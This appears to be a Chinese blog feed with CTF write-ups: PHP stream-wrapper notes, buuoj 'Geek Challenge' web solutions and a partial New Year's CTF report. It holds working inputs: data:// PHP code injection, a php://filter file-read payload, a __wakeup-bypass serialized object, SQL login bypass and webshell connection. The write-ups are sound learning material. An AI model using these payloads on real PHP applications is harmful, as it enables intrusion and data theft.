<li><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流， 允许你以 <a href="https://www.php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a> 和 <a href="https://www.php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a> 一样的方式 写入到输出缓冲区。</p>
</li>
</ol>
<h3 id="0x03-zip-bzip2-zlib-协议"><a href="#0x03-zip-bzip2-zlib-协议" class="headerlink" title="0x03 zip://, bzip2://, zlib://协议"></a>0x03 zip://, bzip2://, zlib://协议</h3><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">Yes（除了 <em>zip://</em>）</td>
</tr>
<tr>
<td align="left">允许附加</td>
<td align="left">Yes（除了 <em>zip://</em>）</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">No，请使用普通的 <em>file://</em> 封装器统计压缩文件。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No，请使用 <em>file://</em> 封装器删除压缩文件。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
</tbody></table>
<h4 id="1-zip-协议"><a href="#1-zip-协议" class="headerlink" title="1. zip://协议"></a>1. zip://协议</h4><p>zip:// [压缩文件路径]#[压缩文件内的子文件]</p>
<p>测试失败 ,报错</p>
<p><strong>【bzip2://协议】</strong></p>
<p><strong>使用方法：</strong></p>
<p>compress.bzip2://[压缩文件地址]</p>
<p>测试失败 没有返回数据</p>
<h4 id="3-zlib-协议"><a href="#3-zlib-协议" class="headerlink" title="3. zlib://协议"></a>3. zlib://协议</h4><p>compress.zlib://[压缩文件地址]</p>
<p><img src="/pic/20.png" alt=""></p>
<h3 id="0x04-data"><a href="#0x04-data" class="headerlink" title="0x04 data://"></a>0x04 data://</h3><p>经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">allow_url_include</a></td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许追加</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
</tbody></table>
<p><a href="http://localhost/temp.php?file=data://text/plain" target="_blank" rel="noopener">http://localhost/temp.php?file=data://text/plain</a>,<?php phpinfo()?></p>
<p><a href="http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=" target="_blank" rel="noopener">http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<p><a href="http://localhost/temp.php?file=data:text/plain" target="_blank" rel="noopener">http://localhost/temp.php?file=data:text/plain</a>,<?php phpinfo()?></p>
<p><a href="http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=" target="_blank" rel="noopener">http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<p><img src="/pic/21.png" alt=""></p>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p><img src="/pic/22.png" alt=""></p>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录6-极客大挑战web1</title>
    <url>/2020/01/02/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%956-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web1/</url>
    <content><![CDATA[<h1 id="极客大挑战web"><a href="#极客大挑战web" class="headerlink" title="极客大挑战web"></a>极客大挑战web</h1><h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>查看源码,发现提示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$cat=$_GET['cat'];</span></span><br><span class="line"><span class="comment">echo $cat;</span></span><br><span class="line"><span class="comment">if($cat=='dog')&#123;</span></span><br><span class="line"><span class="comment">    echo 'Syc&#123;cat_cat_cat_cat&#125;';</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload=<code>?cat=dog</code></p>
<a id="more"></a>

<p><img src="/pic/9.png" alt=""></p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码直接获取结果</p>
<p><img src="/pic/10.png" alt=""></p>
<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>使用菜刀或者蚁剑连接 密码Syc</p>
<p><img src="/pic/11.png" alt=""></p>
<p>flag在根目录下</p>
<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> &gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#master</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">left</span><span class="selector-pseudo">:44</span>%;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">bottom</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span> <span class="selector-pseudo">:center</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>蒋璐源的秘密<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"background-color:black;"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;</span>你想知道蒋璐源的秘密么？<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span>想要的话可以给你，去找吧！把一切都放在那里了！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"master"</span> <span class="attr">href</span>=<span class="string">"./Archive_room.php"</span> <span class="attr">style</span>=<span class="string">"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;"</span>&gt;</span>Oh! You found me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 0;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击其中的链接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> &gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#master</span>	&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">left</span><span class="selector-pseudo">:44</span>%;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">bottom</span><span class="selector-pseudo">:20</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span> <span class="selector-pseudo">:center</span>;</span></span><br><span class="line">    	&#125;</span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>绝密档案<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"background-color:black;"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;</span></span><br><span class="line">		我把他们都放在这里了，去看看吧		<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"master"</span> <span class="attr">href</span>=<span class="string">"./action.php"</span> <span class="attr">style</span>=<span class="string">"background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">6</span>&gt;</span>SECRET<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 0;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再次点击链接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>END<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"background-color:black;"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;</span>查阅结束<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span>没看清么？回去再仔细看看吧。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 0;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>和之前南邮cft的一道web有点像</p>
<p>直接上burp suite</p>
<p>一直点，查看记录，发现有一个</p>
<p><img src="/pic/12.png" alt=""></p>
<p>打开发现源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p>
<p>将得到的base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;d144e819-346a-49ab-98e7-2fea0b2b9f6d&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;htmlPgo</span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>常规扫描手工or御剑，发现<code>www.zip</code>存在源码</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;    <span class="comment">//此处需要绕过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php中关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">   $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">   $res=unserialize(@$select);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'Syc&#123;dog_dog_dog_dog&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析后这是一个序列化+绕过<code>__wakeup()</code>  </p>
<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
<p><code>serialize()</code> 会检查是否存在一个 <code>__sleep()</code> 方法。如果存在，则会先调用 <code>__sleep()</code> 。</p>
<p><code>CVE-2016-7124</code>提到<code>unserialize()</code> 绕过<code>__wakeup()</code>的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(urlencode(serialize($a))); <span class="comment">//O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></span><br><span class="line">var_dump(serialize($a));<span class="comment">//O:4:"Name":2:&#123;s:14:"�Name�username";s:5:"admin";s:14:"�Name�password";i:100;&#125;   </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为有不可打印字符，所以选择经过URL编码后的</p>
<p><code>payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code></p>
<p><img src="/pic/13.png" alt=""></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>元旦安恒月赛</title>
    <url>/2020/01/02/%E5%85%83%E6%97%A6%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="安恒元旦月赛"><a href="#安恒元旦月赛" class="headerlink" title="安恒元旦月赛"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>
<a id="more"></a>

<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="爆破鬼才"><a href="#爆破鬼才" class="headerlink" title="爆破鬼才"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>
<p>解压后还是一个压缩包</p>
<p><img src="/pic/6.png" alt=""></p>
<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x7d90ee19</span>   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    <span class="keyword">print</span>  s</span><br></pre></td></tr></table></figure>

<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>
<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>
<p>最后跑出来的密码是20140224。拿着key解密</p>
<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>
<p><img src="/pic/7.png" alt=""></p>
<p>玩了一把后查看源码，发现有一个js。</p>
